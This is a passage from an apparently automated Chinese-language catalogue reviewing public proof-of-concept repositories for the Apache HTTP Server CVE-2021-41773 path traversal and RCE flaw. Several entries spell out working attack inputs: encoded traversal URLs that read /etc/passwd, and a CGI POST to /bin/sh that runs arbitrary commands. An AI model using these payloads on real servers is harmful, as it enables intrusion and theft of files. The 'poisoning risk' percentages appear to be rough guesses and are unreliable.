CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。攻击者可以利用路径遍历绕过 Alias 指令的限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，并且被访问的目录中存在可执行的 CGI 脚本，攻击者就可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
提供的 POC 代码旨在利用此漏洞。`exploit.py` 脚本首先尝试通过发送包含路径遍历序列的 HTTP 请求来验证目标是否易受攻击，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果从 `/etc/passwd` 文件中检测到 "root:" 和 "bin/" 字符串，则认为目标易受攻击。然后，该脚本尝试利用漏洞通过反向 shell 在目标上执行任意代码。

**利用方式：**
1.  使用路径遍历序列（例如，`.%2e` 或 URL 编码的 `.%2532%2565`）来绕过目录限制。
2.  尝试读取敏感文件，如 `/etc/passwd`，以验证漏洞的存在。
3.  如果服务器配置允许，则利用 CGI 脚本执行任意命令。这通常涉及构造包含命令的 URL，并将该 URL 发送到易受攻击的服务器。
4. 设置监听器，等待反向shell连接。

**投毒风险：**
虽然主要代码看起来直接实现了漏洞利用，但仍然存在一定的投毒风险。可能性大约为 10%。

*   依赖关系：`exploit.py` 脚本依赖于 `requests` 库。虽然 `requests` 是一个流行的 Python 库，但存在供应链攻击的风险。恶意攻击者可能会尝试污染 `requests` 库或类似的依赖项，从而在不知不觉中将恶意代码引入到 `exploit.py` 中。
*   CGI配置的判断：如果目标服务器上未启用 CGI 或 CGI 配置不正确，该漏洞可能无法利用进行 RCE。POC代码中关于CGI的利用可能无法执行.
*   代码审查：在执行任何未经审核的代码（包括此 POC）之前，务必进行彻底的代码审查，以确保其不包含恶意功能。特别注意反向 shell 部分，确保它只执行预期命令。
*  作者动机: 无法完全信任代码作者的真实目的。尽管代码可能有效利用漏洞，但作者可能有意或无意地包含后门或恶意代码。
* 编码问题：URL 编码和解码可能存在问题，导致意外行为。

**项目地址:** [adrianmafandy/CVE-2021-41773](https://github.com/adrianmafandy/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #19

**来源**: [CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md](../2021/CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的 URL，读取服务器上受限目录之外的文件。如果服务器上启用了 CGI 脚本执行，则攻击者可以进一步利用此漏洞执行任意代码。

**有效性:**
根据漏洞库信息，搜索引擎结果，以及漏洞利用代码，提供的POC代码是有效的。漏洞库信息和搜索结果都表明此漏洞已被公开利用。

**投毒风险:**
提供的Go语言漏洞利用代码，主要功能是利用路径遍历漏洞读取`/etc/passwd`文件或执行命令。虽然代码本身实现了漏洞验证和利用功能，但仍然存在一定的投毒风险。

1.  **依赖风险:** Go程序需要编译，编译过程中可能引入恶意依赖。但是本项目代码量较小，依赖风险较低。
2.  **后门代码:** 检查代码后，发现其中并没有明显的恶意代码或后门。然而，攻击者可以修改代码以包含恶意功能，例如上传受害服务器的信息或执行其他恶意操作。
3.  **供应链风险:** 代码托管在第三方平台（GitHub），存在被篡改的风险。如果从不可信的来源下载代码，可能会下载到被修改过的恶意版本。

综合考虑，该仓库存在10%的投毒风险，主要来自潜在的依赖污染和代码篡改。

**利用方式:**
该漏洞的利用方式主要分以下几步：

1.  **路径遍历:** 攻击者构造包含`/.%2e`的恶意URL，尝试绕过Apache的路径规范化检查，从而访问服务器上任意文件。
2.  **信息泄露:** 如果路径遍历成功，攻击者可以读取敏感文件，例如`/etc/passwd`，获取系统用户信息。
3.  **远程代码执行:** 如果服务器启用了CGI脚本，攻击者可以通过POST请求将恶意命令传递给`sh`执行，从而实现远程代码执行。 例如，可以发送包含 `echo; <command>` 的POST请求到 `/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh`。

**项目地址:** [aqiao-jashell/CVE-2021-41773](https://github.com/aqiao-jashell/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #20

**来源**: [CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md](../2021/CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并可能需要启用`mod_cgi`模块且存在`Require all granted`配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。该漏洞源于 `ap_normalize_path` 函数在路径规范化处理上的缺陷，允许攻击者通过构造包含 URL 编码字符（如 `.%2e`）的恶意 URL，绕过路径遍历保护机制，访问服务器文件系统上受限目录之外的文件。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用 `.%2e` 绕过路径规范化，构造恶意 URL 以访问任意文件。例如，`http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` 可以用来尝试读取 `/etc/passwd` 文件。

2.  **远程代码执行（RCE）：** 如果服务器启用了 `mod_cgi` 模块，攻击者可以通过上传恶意 CGI 脚本并利用路径遍历漏洞执行该脚本，从而实现远程代码执行。这通常需要结合服务器配置中 `cgi-bin` 目录的 `Require all granted` 指令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，POC 代码的存在进一步验证了其有效性。提供的 README.md 文件详细解释了漏洞原理和利用方法，并提供了搭建漏洞环境的步骤。

**投毒风险：**

虽然提供的 README.md 文件主要包含漏洞说明和环境搭建指导，但是依然存在一定的投毒风险。主要考虑到，如果攻击者修改了环境搭建脚本，例如在安装过程中植入后门，则可能导致受害者搭建一个包含恶意代码的 Apache 服务器。所以需要人工审核确认脚本的安全性，这里认为存在10%的投毒风险。

**总结：**

该漏洞的利用依赖于特定的 Apache 版本和服务器配置。成功利用该漏洞可能导致严重的后果，包括敏感信息泄露和远程代码执行。用户应尽快升级 Apache HTTP Server 版本以修复此漏洞。

**项目地址:** [ashique-thaha/CVE-2021-41773-POC](https://github.com/ashique-thaha/CVE-2021-41773-POC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #21

**来源**: [CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md](../2021/CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并且Alias-like 指令配置不当，未对外部文件进行访问限制，同时开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如`.%%32%65`）的URL，绕过服务器的路径规范化检查，从而访问到Alias-like指令配置目录以外的文件。如果目标服务器未对这些目录的文件进行访问限制（`require all denied`），攻击者就能读取敏感信息。更进一步，如果服务器允许在这些路径下执行CGI脚本，攻击者就可以实现远程代码执行。

**有效性分析：**

漏洞库信息和搜索结果均表明该漏洞已在野外被利用，PoC代码的存在也证实了其可利用性。

**利用方式分析：**

根据漏洞描述和提供的PoC代码，可以总结出以下利用方式：

1.  **路径遍历攻击：** 攻击者构造包含特殊编码的路径，例如：`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`尝试读取`/etc/passwd`等敏感文件。
2.  **文件读取：**  如果服务器没有对目标文件进行访问限制，攻击者可以直接读取到文件内容。
3.  **远程代码执行（RCE）：** 如果目标路径允许执行CGI脚本，攻击者可以上传恶意脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**投毒风险分析：**

提供的PoC代码主要包含以下文件：

*   `1.rb`：一个 Metasploit 模块，尝试通过 GET 请求访问特定 URI（`http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt`）。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `2.rb`：另一个 Metasploit 模块，尝试通过 GET 请求获取 PDF 文件内容 (tugas.pdf)。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `Makefile`：包含 Maven 命令，用于编译和执行 Java 代码。该命令执行 `com.shell.ReverseShell` 类，并传递一些参数，包括文件名、IP 地址、路径等。**`com.shell.ReverseShell` 存在潜在的投毒风险，因为它可能包含反向 shell 或其他恶意功能。**
*   `apache_rce.rb`：Metasploit 模块，未完全贴出，但是根据文件名推测是进行远程代码执行的模块，存在一定风险。

综合来看，`Makefile` 中调用的 Java 类 `com.shell.ReverseShell` 是最可疑的部分。如果该类包含恶意代码，例如反向 shell，那么执行此 Makefile 就可能导致受害者系统被控制。其他rb文件目前主要进行get请求，风险较低。

**风险评估：**

虽然大部分代码看起来是用于漏洞利用，但是 `Makefile` 中调用的`com.shell.ReverseShell` 存在潜在风险，如果里面包含恶意代码，比如反向 shell，则有被投毒的可能。因此，存在一定的投毒风险，比例估计为10%。

**项目地址:** [belajarqywok/CVE-2021-41773-MSF](https://github.com/belajarqywok/CVE-2021-41773-MSF)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #22

**来源**: [CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md](../2021/CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在可执行的CGI脚本目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 和 CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造特殊的URL来访问服务器上的任意文件，如果服务器启用了CGI脚本执行，则可能导致远程代码执行。

**有效性：**
提供的PoC代码（`exploit.py`）是有效的。它包含利用路径遍历读取任意文件和利用CGI执行远程代码的payload。脚本首先检查目标服务器是否易受攻击（通过检查`Server`头），然后根据用户选择的选项执行相应的攻击。

**投毒风险：**
分析提供的PoC代码，没有发现明显的投毒代码。代码结构清晰，功能明确，主要是构造恶意请求来利用漏洞。脚本中的操作都是为了验证和利用漏洞，没有发现任何隐藏的恶意行为。
投毒风险评估：0%

**利用方式：**
1.  **路径遍历：** 攻击者通过在URL中使用经过特殊编码的路径（例如，`.%2e/%2e%2e`）来绕过服务器的路径检查，从而访问受限目录之外的文件。PoC代码中提供了两个路径遍历Payload `payload1`和`payload2`，利用 `GET` 请求读取文件内容。
2.  **远程代码执行：** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历访问到`bin/sh`，然后通过POST请求将命令作为数据传递给`bin/sh`执行。PoC代码中构造了包含命令的POST请求，利用`req.Session()`和`req.Request()`发送请求并接收响应，实现交互式shell。

**总结：**
该漏洞的利用需要目标服务器存在漏洞版本（2.4.49或2.4.50），并且在路径遍历访问到文件之后，如果服务器配置允许，可以进一步利用CGI执行进行远程代码执行。提供的PoC代码可以成功验证并利用该漏洞，未发现投毒风险。

**项目地址:** [blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #23

**来源**: [CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md](../2021/CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的Alias-like指令配置允许访问受限目录外的文件，同时CGI脚本未被禁用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。该漏洞源于Apache HTTP Server对路径规范化处理的缺陷。攻击者可以通过构造包含URL编码的路径遍历序列的恶意HTTP请求，绕过服务器的安全检查，读取服务器上任意文件，甚至可能执行任意代码。

**有效性分析：**

提供的PoC代码通过构造包含`/.%2e/%2e%2e/%2e%2e/%2e%2e/`的URL，利用Apache HTTP Server 2.4.49的路径遍历漏洞读取指定文件。PoC代码使用`urllib3`库发送HTTP请求，避免了`requests`库自动URL规范化导致的利用失败。
根据漏洞库信息、搜索引擎结果和PoC代码，可以判断该PoC代码有效。

**投毒风险分析：**

对提供的PoC代码进行分析，主要包括以下几个文件：

*   `README.md`: 描述了漏洞的详细信息、利用方法和示例。没有发现恶意代码。
*   `cve-2021-41773.py`: 漏洞利用脚本。该脚本的功能是发送包含恶意路径的HTTP请求，读取指定文件。没有发现明显的恶意代码，但存在潜在风险，即攻击者可能利用该脚本读取服务器上的敏感信息，并进行进一步的攻击。不过从代码本身来看，功能单一，不包含任何额外的后门或者恶意功能。
*   `requirements.txt`: 声明了所需的Python依赖库，包括`requests`和`urllib3`。这两个库都是常用的Python库，没有发现恶意库。

综合分析，该仓库中存在作者隐藏的投毒代码的可能性较低，但不能完全排除攻击者利用该脚本进行恶意活动的风险。

**利用方式：**

1.  **确定目标服务器：** 确定运行Apache HTTP Server 2.4.49的目标服务器。
2.  **检查配置：** 检查目标服务器的`Alias-like`指令配置，确认是否存在允许访问受限目录外的文件的配置。
3.  **构造恶意URL：** 构造包含URL编码的路径遍历序列的恶意URL，例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`。
4.  **发送HTTP请求：** 使用PoC脚本或其他工具发送包含恶意URL的HTTP请求。
5.  **读取文件：** 如果漏洞利用成功，服务器将返回指定文件的内容。
6. **远程代码执行：** 如果CGI脚本被允许执行，攻击者可以上传一个恶意的CGI脚本并执行，从而实现远程代码执行。

**项目地址:** [blu3ming/PoC-CVE-2021-41773](https://github.com/blu3ming/PoC-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #24

**来源**: [CVE-2021-41773-charanvoonna_CVE-2021-41773.md](../2021/CVE-2021-41773-charanvoonna_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49版本，并且配置允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于对路径规范化处理的更改存在缺陷导致。攻击者可以利用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，则请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且已被广泛利用。提供的 Dockerfile 和 README.md 文件提供了一个可行的漏洞利用方式。

**利用方式：**
1.  **路径遍历：** 攻击者可以通过构造包含 `..` 或 URL 编码的 `..%2f` 的恶意 URL，绕过服务器的路径检查，访问受限文件。
2.  **CGI 执行：** 如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历访问 CGI 脚本，并执行任意代码。

**POC 代码分析：**

*   **Dockerfile:** 该 Dockerfile 用于构建一个存在 CVE-2021-41773 漏洞的 Apache HTTP Server 2.4.49 环境。
    *   `FROM httpd:2.4.49`：指定使用 Apache HTTP Server 2.4.49 镜像作为基础镜像。
    *   `RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf`：启用 CGI 模块。
    *   `RUN echo ...`：配置 CGI 目录，允许执行 CGI 脚本。
    *   `RUN echo "AllowEncodedSlashes On" >> /usr/local/apache2/conf/httpd.conf`：允许 URL 中包含编码的斜杠，这是利用该漏洞的关键。
    *   `COPY test.cgi /usr/local/apache2/cgi-bin/test.cgi`：复制一个测试 CGI 脚本到 CGI 目录下。
    *   `RUN chmod +x /usr/local/apache2/cgi-bin/test.cgi`：为测试 CGI 脚本添加执行权限。
*   **README.md:** 该文件描述了 CVE-2021-41773 漏洞的细节，以及如何使用 Nmap NSE 脚本检测该漏洞。提供了 Nmap 脚本的架构、payload 设置、HTTP 请求和响应处理、输出格式和错误处理。

**投毒风险：**
提供的 Dockerfile 主要用于搭建漏洞环境以进行验证，风险极低。它本身没有包含恶意代码。
虽然 *test.cgi* 文件内容未知，这里假设 *test.cgi* 为安全的代码，否则投毒的概率会升高。
综合评估投毒风险为 1%。


**项目地址:** [charanvoonna/CVE-2021-41773](https://github.com/charanvoonna/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #25

**来源**: [CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md](../2021/CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution (RCE)

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件或执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。该漏洞源于对路径规范化的更改，使得攻击者可以使用路径遍历攻击将URL映射到Alias-like指令配置的目录之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，请求可能会成功。如果CGI脚本对这些别名路径启用，则可能导致远程代码执行。

**利用方式：**
攻击者可以构造包含编码后的路径遍历字符（例如`.%2e`）的HTTP请求，绕过服务器的安全检查，访问服务器文件系统上的任意文件。如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意脚本并执行来实现远程代码执行。

**有效性：**
提供的PoC代码`exploit.sh`看起来是有效的。它使用`curl`命令发送包含路径遍历序列的请求，并尝试执行指定的命令。Dockerfile和httpd-path-traversal.conf文件配置了一个易受攻击的Apache服务器环境，用于测试路径遍历。

**投毒风险：**
检查提供的文件，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/README.md`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/exploit.sh`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/Dockerfile`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/httpd-path-traversal.conf`。这些文件看起来主要用于演示和利用CVE-2021-41773漏洞。其中，`exploit.sh`脚本存在一定的风险，攻击者可以利用此脚本执行恶意命令。`httpd-path-traversal.conf` 配置，如果被攻击者修改，会导致服务器存在后门，但是从目前的代码来看，投毒风险较低。只有 `exploit.sh`存在可被利用的风险，但这不是作者主动投毒，所以投毒风险很低。

**项目地址:** [dileepdkumar/LayarKacaSiber-CVE-2021-41773](https://github.com/dileepdkumar/LayarKacaSiber-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #26

**来源**: [CVE-2021-41773-gunzf0x_CVE-2021-41773.md](../2021/CVE-2021-41773-gunzf0x_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了cgi-bin目录的执行权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。攻击者可以通过构造包含特殊编码的 URL，利用路径遍历漏洞访问受限目录之外的文件。如果服务器配置允许 CGI 脚本执行，则可以进一步利用该漏洞执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。漏洞库中提到该漏洞已在野外被利用，多个搜索结果也证实了该漏洞的存在和潜在危害，并提供了利用示例。PoC 代码实现了利用路径遍历漏洞执行命令的功能。

**投毒风险：**
PoC 代码主要功能是利用漏洞实现远程命令执行。以下是对代码可能存在的投毒风险的分析：

*   **代码结构和功能：** PoC 代码结构清晰，主要包括参数解析、URL 构造和 HTTP 请求发送等功能。这些功能都与漏洞利用直接相关。
*   **潜在的风险点：**  PoC 代码中存在一些潜在的风险点：
    *   `data_payload: str = f"echo Content-Type: text/plain; echo; {args.command}"` ，args.command参数如果被恶意构造，可能会导致执行非预期的系统命令。
        *   虽然`clean_url`函数旨在清理URL，但可能存在绕过的风险。

总体来说，代码的投毒风险较低，大概在5%。主要风险集中在命令执行的参数上，以及URL清洗函数可能存在的绕过。

**利用方式：**
1.  **确定目标：** 找到运行 Apache HTTP Server 2.4.49 的目标服务器，并确认 `cgi-bin` 目录已启用。
2.  **构造 Payload：** 使用包含路径遍历的 URL 和要执行的命令构造 HTTP POST 请求。URL 的基本格式如下：
    ```
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
    ```
    其中，`.%2e` 是 `..` 的 URL 编码，用于绕过路径检查。`bin/sh` 是要执行的 shell 程序的路径。
3.  **发送请求：**  将构造好的 HTTP POST 请求发送到目标服务器。
4.  **获取结果：**  如果漏洞利用成功，服务器将执行指定的命令，并将结果作为 HTTP 响应返回。

**项目地址:** [gunzf0x/CVE-2021-41773](https://github.com/gunzf0x/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #27

**来源**: [CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md](../2021/CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当或CGI脚本启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径穿越漏洞。攻击者可以通过构造包含`..`的恶意URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了CGI脚本，攻击者可能进一步利用该漏洞执行远程代码。根据漏洞描述，需要特定的配置错误，例如，文件没有被"require all denied"保护。从提供的漏洞利用代码看， 该代码本身是一个 CTF 的 Writeup， 解释了漏洞原理和利用方式，本身不包含恶意代码，但可能存在作者隐藏的后门代码的风险，但是可能性极低。

**有效性：**
该漏洞利用代码(CTF Writeup) 本身不直接用于漏洞利用，而是用于解释该漏洞，根据搜索引擎结果，该漏洞真实存在且被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个CTF Writeup，主要用于讲解漏洞原理，本身不太可能包含恶意投毒代码， 但为了安全起见， 风险评估为5%。

**利用方式：**
1.  **路径穿越：** 构造包含`..`的URL，例如`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试访问服务器上的敏感文件，如`/etc/passwd`。
2.  **RCE（如果CGI启用）：**如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意CGI脚本并执行它，来实现远程代码执行。 需要注意的是，通常需要结合Alias指令的配置不当才能实现。

**利用前提：**
*   Apache HTTP Server版本为2.4.49。
*   目标文件所在目录没有被`require all denied`限制。
*   （可选）服务器启用了CGI脚本，并且Alias指令配置不当。

**项目地址:** [hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-](https://github.com/hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #28

**来源**: [CVE-2021-41773-javaamo_CVE-2021-41773.md](../2021/CVE-2021-41773-javaamo_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并启用了cgi-bin目录，且该目录下的文件没有被'require all denied'保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以通过构造包含特殊字符的 URL，绕过 Alias 类似的指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时启用了 CGI 脚本支持，攻击者甚至可以执行任意代码。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该漏洞利用是有效的。搜索引擎结果也表明该漏洞已被公开利用。

**投毒风险：**
提供的漏洞利用代码主要由一个shell脚本和一个README文件组成。shell脚本的功能是向目标服务器发送包含恶意路径的HTTP请求，读取指定文件或执行命令。README文件是对漏洞利用代码的说明。
脚本本身存在投毒的可能性较低，风险预估1%。主要风险点在于targets.txt文件，如果攻击者替换了targets.txt中的目标，可能会导致非授权的扫描或者攻击。需要注意的是，该PoC本身就是用于攻击的，因此不能将利用漏洞的代码判定为投毒。

**利用方式：**
1.  准备：准备一个包含目标服务器地址列表的 `targets.txt` 文件。
2.  路径遍历：使用`./50383.sh targets.txt /etc/passwd`尝试读取敏感文件，例如`/etc/passwd`。
3.  远程代码执行：如果目标服务器启用了 CGI，则可以通过类似`./50383.sh targets.txt /bin/sh whoami`的方式执行命令。
   需要注意的是，该POC代码尝试利用路径遍历漏洞，将请求发送到`/cgi-bin/`目录，从而触发CGI脚本的执行，最终达到远程代码执行的目的. 如果CGI未开启，则只能进行文件读取。

**项目地址:** [javaamo/CVE-2021-41773](https://github.com/javaamo/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #29

**来源**: [CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md](../2021/CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和文件泄露

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置存在缺陷，允许访问受限目录外的文件，并且可能开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

**有效性分析：**

根据漏洞库信息和搜索引擎结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞，且已被公开利用。搜索引擎结果显示该漏洞允许未经验证的攻击者访问敏感信息，甚至执行任意代码。漏洞库信息也证实了这一点，并指出该漏洞允许攻击者绕过 Alias 指令配置的目录限制，访问未受 "require all denied" 保护的文件。如果目标配置允许，还可能执行 CGI 脚本。

**投毒风险分析：**

提供的“漏洞利用代码”实际上包含两个文件：README.md 和 index.html。

*   **README.md：**  只是一个简单的文本文件，描述了该漏洞和远程代码执行。
*   **index.html：** 是由 pdf2htmlEX 生成的 HTML 文件，用于显示 PDF 内容。这个HTML 文件看起来是正常的，没有任何明显的恶意代码，它的作用仅仅是将PDF转换成了HTML，并没有什么可疑的js或者链接。

因此，提供的代码仓库中**没有**发现任何明显的投毒代码。 投毒风险极低，几乎为0%的可能性

**利用方式：**

